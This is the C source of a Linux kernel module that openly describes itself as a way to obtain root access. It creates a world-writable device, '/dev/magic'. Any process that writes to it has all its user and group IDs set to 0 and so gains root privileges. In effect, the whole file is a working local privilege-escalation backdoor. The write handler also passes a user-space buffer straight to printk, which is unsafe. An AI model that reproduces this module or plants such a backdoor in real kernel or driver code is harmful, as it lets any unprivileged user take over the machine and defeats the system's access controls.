#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/fs.h>          	/* Needed for char device registration */
#include <linux/cdev.h>		/* Needed for char device registration */
#include <linux/cred.h>		/* Needed for root credential */

MODULE_LICENSE("GPL");             
MODULE_AUTHOR("Zharaskhan Aman");
MODULE_DESCRIPTION("A simple module to obtain root access");
MODULE_VERSION("0.1");  

static ssize_t custom_write(struct file *, const char __user *, size_t, loff_t *);
static dev_t first;

static struct device* custom_dev = NULL;
static struct class*  custom_class = NULL;
static struct cdev cdev;

struct file_operations fops = {
	.owner = THIS_MODULE,
	.write = custom_write,
};

ssize_t custom_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
{
	printk(KERN_INFO "Write function call:\n%s\n", buf);

	struct cred *root_cred;
	root_cred = prepare_creds();
	
	if (root_cred == NULL) {
		printk(KERN_INFO "Error\n");
		return len;
	}
	root_cred->uid.val = 0;
	root_cred->gid.val = 0;
       	root_cred->euid.val = 0;
	root_cred->egid.val = 0;
	root_cred->suid.val = 0;
	root_cred->sgid.val = 0;
	root_cred->fsuid.val = 0;
	root_cred->fsgid.val = 0;

	commit_creds(root_cred);

	return len;
}

static int permission_uevent(struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}

int init_module(void)
{
	printk(KERN_INFO "Root module starts.\n");

	//Allocating memory
	int error = alloc_chrdev_region(&first, 0, 1, "magic");
	
	if (error < 0) {
		printk(KERN_ERR "Couldn't allocate memory.\n");
		return error;
	}
	
	printk(KERN_INFO "Device number %d:%d\n", MAJOR(first), MINOR(first));

	//register class
	custom_class = class_create(THIS_MODULE, "magic");
	if (IS_ERR(custom_class)) {
		printk(KERN_ERR "Couldn't register class.\n");
		unregister_chrdev_region(first, 1);
		return PTR_ERR(custom_class);
	}
	custom_class->dev_uevent = permission_uevent;
	
	//register device
	custom_dev = device_create(custom_class, NULL, first, NULL, "magic");
	if (IS_ERR(custom_dev)) {
		printk(KERN_ERR "Coudn't register device.\n");
		class_destroy(custom_class);
		unregister_chrdev_region(first, 1);
		return PTR_ERR(custom_dev);
	}

	//init new device
	cdev_init(&cdev, &fops);
	cdev.owner = THIS_MODULE;
	//adding to kernel new device
	error = cdev_add(&cdev, first, 1);

	if (error < 0) {
		printk(KERN_ERR "Coudn't add new device.\n");
		device_destroy(custom_class, first);
		class_unregister(custom_class);
		class_destroy(custom_class);
		unregister_chrdev_region(first, 1);
		return error;
	}
	return 0;
}

void cleanup_module(void)
{
	printk(KERN_INFO "Root module ends.\n");

	cdev_del(&cdev);
	device_destroy(custom_class, first);
	class_unregister(custom_class);
	class_destroy(custom_class);
	//Deallocating memory
	unregister_chrdev_region(first, 1);
}
